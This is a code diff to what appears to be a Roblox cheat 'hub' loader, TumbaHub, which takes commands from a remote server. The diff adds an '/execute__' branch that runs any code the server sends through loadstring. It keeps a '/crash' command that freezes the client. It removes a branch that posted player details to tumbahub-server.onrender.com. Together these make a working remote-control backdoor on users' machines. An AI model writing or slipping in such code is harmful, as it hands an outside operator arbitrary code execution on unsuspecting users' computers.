@@ -62,44 +62,26 @@ task.spawn(function()
                     elseif cmd == "/crash" then
                         while true do end 
                         
-                    -- 4. Остальные команды из твоего модульного хаба
-                    elseif Mega and Mega.Commands and Mega.Commands[cmd] then
-                        task.spawn(Mega.Commands[cmd], data)
+                    -- 4. Выполнение кастомного скрипта (RCE)
+                    elseif string.find(cmd, "^/execute__") then
+                        -- Вырезаем сам код (всё, что идет после 10-го символа "/execute__")
+                        local codeToRun = string.sub(cmd, 11)
+                        
+                        -- Функция loadstring превращает текст в выполняемый код
+                        local compiledFunc, compileError = loadstring(codeToRun)
+                        
+                        if compiledFunc then
+                            -- Выполняем код в отдельном потоке, чтобы не застопорить лоадер
+                            task.spawn(compiledFunc)
+                        else
+                            warn("TumbaHub: Ошибка компиляции скрипта: " .. tostring(compileError))
+                        end
                     end
-                    -- 5. Проверка статуса игрока
-                        elseif cmd == "/check_status" then
-                            task.spawn(function()
-                                -- Собираем инфу об игроке
-                                local character = LocalPlayer.Character
-                                local humanoid = character and character:FindFirstChild("Humanoid")
-                                
-                                local hp = humanoid and math.floor(humanoid.Health) or 0
-                                local maxHp = humanoid and math.floor(humanoid.MaxHealth) or 0
-                                local state = (hp > 0) and "Жив 🟢" or "Мертв 🔴"
-                                
-                                -- Формируем красивое сообщение для Телеграма
-                                local statusText = string.format(
-                                    "📊 **Статус игрока %s**\nСостояние: %s\n❤️ Здоровье: %d/%d\n🎮 Place ID: %d",
-                                    LocalPlayer.Name, state, hp, maxHp, game.PlaceId
-                                )
-                                
-                                -- Отправляем это сообщение на наш сервер
-                                pcall(function()
-                                    requestFunc({
-                                        Url = "https://tumbahub-server.onrender.com/api/send_message",
-                                        Method = "POST",
-                                        Headers = {["Content-Type"] = "application/json"},
-                                        Body = HttpService:JSONEncode({
-                                            username = LocalPlayer.Name,
-                                            message = statusText
-                                        })
-                                    })
-                                end)
-                            end)
+
                     -- =========================
-                end -- закрывает if decodeSuccess
-            end -- закрывает if success
-        end -- закрывает while task.wait
-    end -- закрывает if requestFunc
-end)
+                end -- Закрывает проверку decodeSuccess
+            end -- Закрывает проверку success
+        end -- Закрывает цикл while task.wait
+    end -- Закрывает проверку if requestFunc
+end) -- Закрывает task.spawn(function()
 -- ========================================================
